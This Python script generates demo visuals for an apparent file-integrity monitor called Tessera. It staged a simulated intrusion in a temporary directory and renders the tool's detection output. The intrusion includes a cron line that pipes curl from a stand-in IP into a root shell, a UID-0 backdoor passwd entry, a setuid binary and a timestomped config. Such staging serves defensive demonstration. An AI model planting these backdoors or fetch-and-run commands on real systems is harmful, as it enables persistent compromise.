#!/usr/bin/env python3
"""Generate the README visuals from a real Tessera run.

Builds a throwaway directory tree, records a sealed baseline, simulates
an intrusion (setuid binary, cron backdoor, truncated log, timestomped
config, rewritten passwd) and renders the actual output of ``tessera``:

* docs/assets/check.svg      terminal output of ``tessera check``
* docs/assets/snapshot.svg   terminal output of ``tessera snapshot``
* docs/assets/report.html    the HTML report

Usage: python scripts/make_demo.py
Nothing here is mocked: every byte shown comes from the real CLI.
"""

from __future__ import annotations

import contextlib
import io
import os
import re
import sys
import tempfile
from html import escape
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from tessera.cli import main  # noqa: E402

ASSETS = ROOT / "docs" / "assets"
SGR = re.compile(r"\x1b\[([0-9;]*)m")
CHAR_W, LINE_H, PAD = 8.43, 20, 22
DEFAULT_FG = "#d4d4d8"


def ansi_to_svg(text: str, title: str) -> str:
    lines = text.rstrip("\n").split("\n")
    cols = max(len(SGR.sub("", line)) for line in lines)
    width = int(cols * CHAR_W + PAD * 2)
    height = int(len(lines) * LINE_H + PAD * 2 + 34)
    out = [
        f'<svg xmlns="http://www.w3.org/2000/svg" width="{width}" height="{height}" '
        f'viewBox="0 0 {width} {height}" role="img" aria-label="{escape(title)}">',
        "<style>text{font:13.5px 'JetBrains Mono','Cascadia Code',Menlo,Consolas,monospace;white-space:pre}</style>",
        f'<rect width="{width}" height="{height}" rx="12" fill="#0b0b0f" stroke="#26262d"/>',
        f'<rect width="{width}" height="34" rx="12" fill="#141419"/>',
        f'<rect y="22" width="{width}" height="12" fill="#141419"/>',
        '<circle cx="20" cy="17" r="5.5" fill="#3f3f46"/><circle cx="38" cy="17" r="5.5" fill="#3f3f46"/>'
        '<circle cx="56" cy="17" r="5.5" fill="#3f3f46"/>',
        f'<text x="{width / 2}" y="21.5" fill="#71717a" text-anchor="middle">{escape(title)}</text>',
    ]
    y = 34 + PAD + 13
    for line in lines:
        col, fg, bg, bold = 0, DEFAULT_FG, None, False
        spans: list[str] = []
        pos = 0
        for match in [*SGR.finditer(line), None]:
            end = match.start() if match else len(line)
            chunk = line[pos:end]
            if chunk:
                x = PAD + col * CHAR_W
                if bg:
                    out.append(f'<rect x="{x - 1:.1f}" y="{y - 14}" width="{len(chunk) * CHAR_W + 2:.1f}" '
                               f'height="19" rx="3" fill="{bg}"/>')  # fmt: skip
                weight = ' font-weight="700"' if bold else ""
                spans.append(f'<tspan x="{x:.1f}" fill="{fg}"{weight}>{escape(chunk)}</tspan>')
                col += len(chunk)
            if match is None:
                break
            pos = match.end()
            codes = [int(c) for c in match.group(1).split(";") if c] or [0]
            i = 0
            while i < len(codes):
                c = codes[i]
                if c == 0:
                    fg, bg, bold = DEFAULT_FG, None, False
                elif c == 1:
                    bold = True
                elif c in (38, 48) and i + 4 < len(codes) and codes[i + 1] == 2:
                    color = "#{:02x}{:02x}{:02x}".format(*codes[i + 2 : i + 5])
                    if c == 38:
                        fg = color
                    else:
                        bg = color
                    i += 4
                i += 1
        if spans:
            out.append(f'<text y="{y}" xml:space="preserve">{"".join(spans)}</text>')
        y += LINE_H
    out.append("</svg>")
    return "\n".join(out) + "\n"


def run(*args: str) -> str:
    buffer = io.StringIO()
    os.environ["FORCE_COLOR"] = "1"
    os.environ["COLUMNS"] = "92"
    with contextlib.redirect_stdout(buffer):
        main(list(args))
    return buffer.getvalue()


def main_demo() -> None:
    ASSETS.mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory(prefix="tessera-demo-") as tmp:
        base = Path(tmp)
        site = base / "srv"
        for d in ("etc/cron.d", "usr/bin", "var/log"):
            (site / d).mkdir(parents=True)
        (site / "etc/passwd").write_text("root:x:0:0:root:/root:/bin/bash\n")
        (site / "etc/nginx.conf").write_text("worker_processes auto;\n")
        (site / "etc/motd").write_text("Authorised use only.\n")
        (site / "usr/bin/backup").write_text("#!/bin/sh\ntar czf /backup.tgz /srv\n")
        (site / "var/log/auth.log").write_text("".join(f"line {i}\n" for i in range(500)))
        os.chmod(site / "usr/bin/backup", 0o755)
        config = base / "tessera.toml"
        config.write_text(f"""
[general]
store = '{(base / "state/tessera.db").as_posix()}'
key_file = '{(base / "state/seal.key").as_posix()}'
[[watch]]
path = '{site.as_posix()}'
[[rule]]
pattern = "**/usr/bin/**"
profile = "full"
severity = "high"
[[rule]]
pattern = "**/*.log"
profile = "append"
[[rule]]
pattern = "**/etc/passwd"
profile = "full"
severity = "critical"
""")
        cfg = ["-c", str(config)]
        run("keygen", *cfg)
        snapshot_out = run("snapshot", *cfg, "-l", "golden image")

        # simulated intrusion
        with open(site / "etc/passwd", "a") as f:
            f.write("svc-update:x:0:0::/tmp:/bin/sh\n")
        os.chmod(site / "usr/bin/backup", 0o4755)
        (site / "etc/cron.d/0update").write_text("* * * * * root curl -s http://198.51.100.7/u | sh\n")
        (site / "var/log/auth.log").write_text("line 0\n")
        conf = site / "etc/nginx.conf"
        st = conf.stat()
        conf.write_text("worker_processes auto; include /tmp/.x/*.conf;\n")
        os.utime(conf, ns=(st.st_atime_ns, st.st_mtime_ns))
        (site / "etc/motd").rename(site / "etc/motd.orig")

        check_out = run("check", *cfg)
        run("check", *cfg, "-f", "html", "-o", str(ASSETS / "report.html"))

    # Hide the temporary directory name so the images are stable.
    def clean(text: str) -> str:
        return re.sub(r"/tmp/tessera-demo-[^/\s]+", "", text).replace(str(Path(tempfile.gettempdir())), "")

    (ASSETS / "snapshot.svg").write_text(ansi_to_svg(clean(snapshot_out), "tessera snapshot"), encoding="utf-8")
    (ASSETS / "check.svg").write_text(ansi_to_svg(clean(check_out), "tessera check"), encoding="utf-8")
    html = (ASSETS / "report.html").read_text(encoding="utf-8")
    (ASSETS / "report.html").write_text(clean(html), encoding="utf-8")
    print(f"wrote {ASSETS / 'check.svg'}, {ASSETS / 'snapshot.svg'}, {ASSETS / 'report.html'}")


if __name__ == "__main__":
    main_demo()
